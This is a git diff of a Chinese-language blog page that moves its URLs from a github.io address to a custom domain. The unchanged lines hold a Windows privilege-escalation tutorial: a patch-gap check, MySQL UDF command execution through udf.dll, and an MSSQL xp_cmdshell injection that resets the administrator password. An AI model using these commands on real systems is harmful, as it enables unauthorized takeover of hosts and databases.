@@ -118,7 +118,7 @@
 <meta name="description" content="有时候过不去的不是一个坎，而是心中的那一份执迷。">
 <meta property="og:type" content="website">
 <meta property="og:title" content="404 页面找不到了">
-<meta property="og:url" content="https://Ni7eipr.github.io/404.html">
+<meta property="og:url" content="https://Ni7eipr.com/404.html">
 <meta property="og:site_name" content="Ni7eipr">
 <meta property="og:description" content="有时候过不去的不是一个坎，而是心中的那一份执迷。">
 <meta property="og:locale" content="zh-Hans">
@@ -157,7 +157,7 @@
 
 
 
-  <link rel="canonical" href="https://Ni7eipr.github.io/404.html"/>
+  <link rel="canonical" href="https://Ni7eipr.com/404.html"/>
 
 
 
@@ -355,7 +355,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://Ni7eipr.github.io/2016/07/24/提权后门/windows提权/">
+    <link itemprop="mainEntityOfPage" href="https://Ni7eipr.com/2016/07/24/提权后门/windows提权/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Ni7eipr">
@@ -466,31 +466,31 @@
         <h2 id="水平权限提升"><a href="#水平权限提升" class="headerlink" title="水平权限提升"></a>水平权限提升</h2><p>获得其他用户的权限</p>
 <h2 id="垂直权限提升"><a href="#垂直权限提升" class="headerlink" title="垂直权限提升"></a>垂直权限提升</h2><p>由普通的或者权限不完整的账号提升为拥有完整权限的管理员账号或者root权限</p>
 <h2 id="操作系统漏洞提权"><a href="#操作系统漏洞提权" class="headerlink" title="操作系统漏洞提权"></a>操作系统漏洞提权</h2><h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p>查看系统信息补丁编号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Ni7eipr&gt;systeminfo</span><br><span class="line"></span><br><span class="line">主机名:           </span><br><span class="line">OS 名称:          Microsoft Windows 10 专业版</span><br><span class="line">OS 版本:          10.0.10586 暂缺 Build 10586</span><br><span class="line">......</span><br><span class="line">修补程序:         安装了 6 个修补程序。</span><br><span class="line">                  [01]: KB3139907</span><br><span class="line">                  [02]: KB3140768</span><br><span class="line">                  [03]: KB3142588</span><br><span class="line">                  [04]: KB3173428</span><br><span class="line">                  [05]: KB3174060</span><br><span class="line">                  [06]: KB3172985</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Ni7eipr&gt;systeminfo</span><br><span class="line"></span><br><span class="line">主机名:</span><br><span class="line">OS 名称:          Microsoft Windows 10 专业版</span><br><span class="line">OS 版本:          10.0.10586 暂缺 Build 10586</span><br><span class="line">......</span><br><span class="line">修补程序:         安装了 6 个修补程序。</span><br><span class="line">                  [01]: KB3139907</span><br><span class="line">                  [02]: KB3140768</span><br><span class="line">                  [03]: KB3142588</span><br><span class="line">                  [04]: KB3173428</span><br><span class="line">                  [05]: KB3174060</span><br><span class="line">                  [06]: KB3172985</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>
 <h3 id="检查补丁情况命令"><a href="#检查补丁情况命令" class="headerlink" title="检查补丁情况命令"></a>检查补丁情况命令</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">systeminfo&gt;C:\Windows\Temp\temp.txt&amp;(<span class="keyword">for</span> %i <span class="keyword">in</span> (KB3057191</span><br><span class="line">KB2840221 KB3000061 KB2850851 KB2711167 KB2360937</span><br><span class="line">KB2478960 KB2507938 KB2566454 KB2646524 KB2645640</span><br><span class="line">KB2641653 KB944653 KB952004 KB971657 KB2620712</span><br><span class="line">KB2393802 KB942831 KB2503665 KB2592799 KB956572</span><br><span class="line">KB977165 KB2621440) <span class="keyword">do</span> @<span class="built_in">type</span> C:\Windows\Temp\temp.txt|</span><br><span class="line">@<span class="built_in">find</span> /i "%i"|| @<span class="built_in">echo</span> %i <span class="keyword">Not</span> Installed!)&amp;<span class="built_in">del</span> /f /q /a C:\Windows</span><br><span class="line">\Temp\temp.txt</span><br></pre></td></tr></table></figure>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">systeminfo&gt;C:\Windows\Temp\temp.txt&amp;(<span class="keyword">for</span> %i <span class="keyword">in</span> (KB3124280</span><br><span class="line">KB3143141 KB3134228 KB3079904 KB3077657 KB3124280</span><br><span class="line">KB3045171 KB2829361 KB3000061 KB2850851 KB2707511</span><br><span class="line">KB970483 KB2124261 KB2271195) <span class="keyword">do</span> @<span class="built_in">type</span> C:\Windows</span><br><span class="line">\Temp\temp.txt|@<span class="built_in">find</span> /i "%i"|| @<span class="built_in">echo</span> %i <span class="keyword">Not</span> Installed!)&amp;<span class="built_in">del</span> /f /</span><br><span class="line">q /a C:\Windows\Temp\temp.txt</span><br></pre></td></tr></table></figure>
 <p>执行结果</p>
-<p><img src="https://Ni7eipr.github.io/images/jcbd.png" alt="image"></p>
+<p><img src="https://Ni7eipr.com/images/jcbd.png" alt="image"></p>
 <p>根据结果网上寻找漏洞进行利用</p>
-<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://Ni7eipr.github.io/images/tqjg.png" alt="image"></p>
+<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://Ni7eipr.com/images/tqjg.png" alt="image"></p>
 <h2 id="第三方服务提权"><a href="#第三方服务提权" class="headerlink" title="第三方服务提权"></a>第三方服务提权</h2><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><h4 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h4><p>UDF 就是 User defined Function</p>
 <p><a href="http://www.2cto.com/database/201110/108925.html" target="_blank" rel="noopener">mysql如何编写udf</a><br><a href="http://dev.mysql.com/doc/refman/5.7/en/udf-compiling.html" target="_blank" rel="noopener"> UDF Compiling and Installing</a></p>
-<p>上传一个udf.dll  </p>
+<p>上传一个udf.dll</p>
 <ul>
 <li>若mysql小于5.1版本<br>C:\WINDOWS\udf.dll 或 C:\WINDOWS\system32\udf.dll</li>
-<li><p>大于mysql5.1版本<br>%mysql%\plugin\udf.dll   </p>
+<li><p>大于mysql5.1版本<br>%mysql%\plugin\udf.dll</p>
 </li>
 <li><p>用 select @@plugin_dir 查询plugin路径<br>默认 C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin\udf.dll</p>
 </li>
 </ul>
-<p>使用sql语句创建功能函数  </p>
+<p>使用sql语句创建功能函数</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> shell <span class="keyword">RETURNS</span> <span class="keyword">STRING</span> <span class="keyword">SONAME</span> <span class="string">'udf.dll'</span></span><br></pre></td></tr></table></figure>
 <p>使用sql语句</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> shell(‘cmd<span class="string">','</span>whoami<span class="string">')</span></span><br></pre></td></tr></table></figure>
 <p>删除创建的函数</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> shell;</span><br></pre></td></tr></table></figure>
 <p>直接使用udf.php</p>
-<p><img src="https://Ni7eipr.github.io/images/mtq.png" alt="image"></p>
+<p><img src="https://Ni7eipr.com/images/mtq.png" alt="image"></p>
 <h4 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h4><h3 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h3><p>通过xp_cmdshell组件执行系统命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.aspx?id=1;EXEC</span><br><span class="line">xp_cmdshell ‘net user administrator 123456&apos;;--</span><br></pre></td></tr></table></figure>
 <p>如果xp_cmdshell被关闭</p>
@@ -730,7 +730,7 @@
               <ul class="links-of-blogroll-list">
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://Ni7eipr.github.io" title="Ni7eipr" target="_blank">Ni7eipr</a>
+                    <a href="https://Ni7eipr.com" title="Ni7eipr" target="_blank">Ni7eipr</a>
                   </li>
                 
               </ul>
@@ -934,7 +934,7 @@
         var gitment = new Gitmint({
             id: window.location.pathname, 
             owner: 'Ni7eipr',
-            repo: 'https://ni7eipr.github.io',
+            repo: 'https://Ni7eipr.com',
             
             lang: "" || navigator.language || navigator.systemLanguage || navigator.userLanguage,
             
